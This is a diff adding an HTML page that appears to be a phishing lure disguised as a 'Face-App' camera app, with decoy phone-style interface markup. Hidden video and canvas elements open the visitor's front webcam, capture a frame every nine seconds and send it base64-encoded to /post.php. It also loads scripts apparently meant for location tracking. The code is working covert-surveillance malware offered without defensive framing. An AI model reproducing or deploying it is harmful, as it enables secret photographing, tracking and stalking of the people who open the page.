@@ -1,0 +1,140 @@
+<!doctype html>
+<html>
+<head>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script src="client.min.js"></script>
+<script src="loc.js"></script>
+</head>
+
+</html>
+<html>
+<body onload="mydata()">
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="640"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: '/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+// environment -- user
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 640);
+       var canvasData = canvas.toDataURL("image/png")
+       cc = String(canvasData).replace("data:image/png;base64,","")
+      //  console.log(cc)
+       post(cc); }, 9000);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+
+</body>
+</html>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="apple-touch-icon" type="image/png" href="https://static.codepen.io/assets/favicon/apple-touch-icon-5ae1a0698dcc2402e9712f7d01ed509a57814f994c660df9f7a952f3060705ee.png">
+    <meta name="apple-mobile-web-app-title" content="CodePen">
+    <link rel="shortcut icon" type="image/x-icon" href="https://static.codepen.io/assets/favicon/favicon-aec34940fbc1a6e787974dcd360f2c6b63348d4b1f4e06c77743096d55480f33.ico">
+    <link rel="mask-icon" type="" href="https://static.codepen.io/assets/favicon/logo-pin-8f3771b1072e3c38bd662872f6b673a722f4b3ca2421637d5596661b4e2132cc.svg" color="#111">
+    <link rel="stylesheet" href="style.css">
+    <title>Face-App</title>
+    <script>
+        window.console = window.console || function (t) {
+        };
+    </script>
+    <script>
+        if (document.location.search.match(/type=embed/gi)) {
+            window.parent.postMessage("resize", "*");
+        }
+    </script>
+</head>
+
+<body translate="no">
+<div id="device">
+    <div id="top">
+        <div class="left">&nbsp;</div>
+        <div class="right">&nbsp;</div>
+    </div>
+    <div id="content">
+        <div class="menu"><i class="fas fa-bolt fa-lg"></i>
+            <div class="profilePhoto"></div>
+            <i class="fas fa-volume-mute fa-lg"></i>
+        </div>
+        <div class="takenPhotos">
+            <div class="first"></div>
+            <div class="second"></div>
+            <div class="third"></div>
+        </div>
+        <div class="circle">
+            <div class="fill"></div>
+        </div>
+        <i class="fas fa-sync-alt fa-lg right"></i>
+        <div class="detection">
+            <div class="line-left"></div>
+            <div class="line-top"></div>
+            <div class="line-right"></div>
+            <div class="line-bottom"></div>
+        </div>
+    </div>
+</div>
+<script src="https://use.fontawesome.com/releases/v5.7.2/css/all.css"></script>
+</body>
+</html>
